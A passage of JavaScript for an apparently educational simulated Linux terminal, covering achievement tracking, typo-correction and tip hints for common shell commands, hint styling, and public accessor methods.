        if (/>>/.test(cmdLine)) stats.redirectCount |= 2;
        if (/</.test(cmdLine)) stats.redirectCount |= 4;
        if (stats.redirectCount === 7) {
            this._unlockAchievement('redirect_pro');
        }

        // Easter eggs
        const easterEggs = ['sl', 'cowsay', 'fortune', 'cmatrix', 'figlet', 'lolcat', 'hollywood'];
        const cmd = cmdLine.split(/\s+/)[0];
        if (easterEggs.includes(cmd)) {
            stats.easterEggsFound.add(cmd);
            if (stats.easterEggsFound.size >= 5) {
                this._unlockAchievement('easter_hunter');
            }
        }

        // Job control
        if (['jobs', 'fg', 'bg'].includes(cmd) || cmdLine.trim().endsWith('&')) {
            this._unlockAchievement('job_juggler');
        }
    }

    _trackTabCompletion() {
        this._achievementStats.tabCount++;
        if (this._achievementStats.tabCount >= 50) {
            this._unlockAchievement('tab_master');
        }
    }

    _trackCtrlR() {
        if (!this._achievementStats.ctrlRUsed) {
            this._achievementStats.ctrlRUsed = true;
            this._unlockAchievement('history_buff');
        }
    }

    _trackVimExit(clean) {
        if (clean && !this._achievementStats.vimExitedClean) {
            this._achievementStats.vimExitedClean = true;
            this._unlockAchievement('vim_survivor');
        }
    }

    getAchievements() {
        return this._achievements;
    }

    // ═══════════════════════════════════════════════════════════════
    // SMART HINTS SYSTEM
    // ═══════════════════════════════════════════════════════════════

    _getSmartHint(cmdLine, output) {
        const cmd = cmdLine.split(/\s+/)[0];
        const isError = output && (output.includes('not found') || output.includes('No such') ||
                                   output.includes('Permission denied') || output.includes('command not found'));

        // Command not found hints
        if (output && output.includes('command not found')) {
            const typoHints = {
                'lss': 'Did you mean: ls',
                'cta': 'Did you mean: cat',
                'grpe': 'Did you mean: grep',
                'gerp': 'Did you mean: grep',
                'sl': 'Try: ls (or run sl for a surprise!)',
                'cd..': 'Did you mean: cd ..',
                'dir': 'Linux uses: ls',
                'cls': 'Linux uses: clear',
                'ipconfig': 'Linux uses: ifconfig or ip addr',
                'type': 'Linux uses: cat or file'
            };
            if (typoHints[cmd]) {
                return { type: 'typo', hint: typoHints[cmd] };
            }
        }

        // File not found hints
        if (output && output.includes('No such file')) {
            return {
                type: 'tip',
                hint: 'Pro tip: Use tab completion to auto-complete file paths, or ls to see available files.'
            };
        }

        // Permission denied hints
        if (output && output.includes('Permission denied')) {
            return {
                type: 'tip',
                hint: 'Try: sudo ' + cmdLine + ' (run as administrator)'
            };
        }

        // Educational tips based on commands used
        const educationalTips = {
            'cat': {
                condition: () => !cmdLine.includes('|') && !cmdLine.includes('>'),
                tip: 'Pro tip: Pipe cat output to grep for searching: cat file | grep pattern'
            },
            'ls': {
                condition: () => !cmdLine.includes('-la') && !cmdLine.includes('-l'),
                tip: 'Pro tip: Use ls -la to see hidden files and permissions'
            },
            'grep': {
                condition: () => !cmdLine.includes('-r') && !cmdLine.includes('-i'),
                tip: 'Pro tip: grep -r searches recursively, grep -i ignores case'
            },
            'find': {
                condition: () => true,
                tip: 'Pro tip: Combine with -exec for powerful workflows: find . -name "*.log" -exec grep "error" {} \\;'
            },
            'ps': {
                condition: () => !cmdLine.includes('aux'),
                tip: 'Pro tip: ps aux shows all processes with details'
            }
        };

        if (educationalTips[cmd] && !isError) {
            const tipInfo = educationalTips[cmd];
            if (tipInfo.condition() && Math.random() < 0.3) { // 30% chance to show tip
                return { type: 'tip', hint: tipInfo.tip };
            }
        }

        return null;
    }

    _showSmartHint(hint) {
        if (!hint) return;

        const hintEl = document.createElement('div');
        hintEl.className = 'clh-smart-hint';
        hintEl.innerHTML = `
            <span class="clh-hint-icon">${hint.type === 'typo' ? '💡' : '📚'}</span>
            <span class="clh-hint-text">${hint.hint}</span>
        `;

        // Add styles if not present
        if (!document.querySelector('#clh-hint-styles')) {
            const style = document.createElement('style');
            style.id = 'clh-hint-styles';
            style.textContent = `
                .clh-smart-hint {
                    background: rgba(59, 130, 246, 0.15);
                    border-left: 3px solid #3b82f6;
                    padding: 8px 12px;
                    margin: 8px 0;
                    border-radius: 0 6px 6px 0;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                    font-size: 0.9em;
                    animation: clh-hint-fade-in 0.3s ease-out;
                }
                .clh-hint-icon { font-size: 1.2em; }
                .clh-hint-text { color: #93c5fd; }
                @keyframes clh-hint-fade-in {
                    from { opacity: 0; transform: translateX(-10px); }
                    to { opacity: 1; transform: translateX(0); }
                }
            `;
            document.head.appendChild(style);
        }

        this.outputEl.appendChild(hintEl);
        this.outputEl.scrollTop = this.outputEl.scrollHeight;
    }

    // Public methods
    getCwd() { return this.currentDir; }
    getUser() { return this.user; }
    getHostname() { return this.hostname; }

    getObjectives() { return this.objectives; }

    getCurrentObjective() {
        for (const obj of this.objectives) {
            if (!this.objectivesCompleted[obj.id]) {
                return obj;
            }
        }
        return null; // All complete
    }

    isObjectiveComplete(id) { return !!this.objectivesCompleted[id]; }
    getCompletedCount() { return this.completedCount; }

    // Public print method for external callers
    print(text, className = '') {
        const line = document.createElement('div');
        line.className = 'terminal-line' + (className ? ` ${className}` : '');
        line.innerHTML = text;
        this.outputEl.appendChild(line);
        this.outputEl.scrollTop = this.outputEl.scrollHeight;
    }
}

// Export for module usage
if (typeof module !== 'undefined' && module.exports) {
    module.exports = CLHTerminal;
}
